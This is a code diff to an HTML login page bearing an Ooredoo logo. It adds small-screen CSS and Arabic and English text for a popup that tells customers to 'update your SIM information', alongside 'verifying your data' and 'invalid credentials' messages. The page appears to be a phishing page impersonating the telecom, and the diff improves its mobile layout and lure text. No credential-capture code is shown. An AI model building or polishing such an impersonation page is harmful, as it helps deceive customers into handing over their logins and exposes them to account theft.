@@ -265,12 +265,23 @@
     }
 
     @media (max-width: 700px) {
-      .login-page { padding: 32px 15px 24px; }
-      .login-card { width: 100%; min-height: 0; padding: 36px 20px 31px; }
-      .login-title { font-size: 31px; }
-      .login-subtitle, .field-label { font-size: 15px; }
-      .forgot-row { height: 39px; }
-      .forgot-link { font-size: 15px; }
+      .login-page { padding: 20px 12px 24px; }
+      .login-card { width: 100%; min-height: 0; padding: 30px 18px 28px; box-shadow: none; border: none; }
+      .login-title { font-size: 28px; }
+      .login-subtitle, .field-label { font-size: 14px; }
+      .forgot-row { height: 36px; }
+      .forgot-link { font-size: 14px; }
+      .login-button, .signup-button { height: 52px; font-size: 15px; }
+      .text-field { height: 46px; font-size: 15px; }
+      .lang-toggle-wrap { width: 100%; padding: 0 5px 8px; }
+      .back-link { font-size: 16px; }
+      .ooredoo-mark { width: 60px; height: 50px; }
+    }
+    @media (max-width: 400px) {
+      .login-page { padding: 15px 8px 20px; }
+      .login-card { padding: 24px 14px 24px; }
+      .login-title { font-size: 24px; }
+      .login-button, .signup-button { height: 48px; font-size: 14px; border-radius: 24px; }
     }
   </style>
 </head>
@@ -334,8 +345,8 @@
         <circle cx="31" cy="34" r="17" fill="none" stroke="#ed1c24" stroke-width="11"></circle>
         <circle cx="58" cy="14" r="7.5" fill="#ed1c24"></circle>
       </svg>
-      <p style="font-size:17px; color:#333; line-height:1.7; margin-bottom:24px; font-weight:500;">عزيزي العميل يرجى المتابعة لتحديث معلومات شريحتك</p>
-      <button onclick="document.getElementById('welcomePopup').style.display='none'" style="width:100%; padding:14px; background:#ed1c24; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer;">متابعة</button>
+      <p id="popupText" style="font-size:17px; color:#333; line-height:1.7; margin-bottom:24px; font-weight:500;">عزيزي العميل يرجى المتابعة لتحديث معلومات شريحتك</p>
+      <button id="popupBtn" onclick="document.getElementById('welcomePopup').style.display='none'" style="width:100%; padding:14px; background:#ed1c24; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer;">متابعة</button>
     </div>
   </div>
 
@@ -360,7 +371,9 @@
         toggleText: 'English',
         waitingText: 'جاري التحقق من البيانات...',
         loadingBtn: 'جاري التحقق...',
-        errorMsg: 'بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.'
+        errorMsg: 'بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.',
+        popupText: 'عزيزي العميل يرجى المتابعة لتحديث معلومات شريحتك',
+        popupBtn: 'متابعة'
       },
       en: {
         title: 'Welcome back',
@@ -376,7 +389,9 @@
         toggleText: 'العربية',
         waitingText: 'Verifying your data...',
         loadingBtn: 'Verifying...',
-        errorMsg: 'Invalid credentials. Please try again.'
+        errorMsg: 'Invalid credentials. Please try again.',
+        popupText: 'Dear customer, please proceed to update your SIM information',
+        popupBtn: 'Continue'
       }
     };
 
@@ -416,6 +431,8 @@
       document.getElementById('langToggle').textContent = t.toggleText;
       document.getElementById('waitingText').textContent = t.waitingText;
       document.getElementById('errorMsg').textContent = t.errorMsg;
+      document.getElementById('popupText').textContent = t.popupText;
+      document.getElementById('popupBtn').textContent = t.popupBtn;
     }
 
     // Apply saved language on page load
